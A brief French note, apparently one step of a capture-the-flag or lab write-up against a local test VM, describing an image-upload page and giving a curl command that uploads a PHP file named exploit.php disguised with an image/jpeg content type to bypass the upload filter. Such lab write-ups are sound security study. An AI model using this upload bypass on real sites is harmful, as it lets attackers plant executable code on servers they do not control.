onpeu upload des images sur : http://192.168.56.101/index.php?page=upload#

on se doute qu ils y a une faille par la donc on upload via curl


 curl  'http://192.168.56.101/?page=upload' -F 'uploaded=@exploit.php;type=image/jpeg' -F 'Upload=Upload'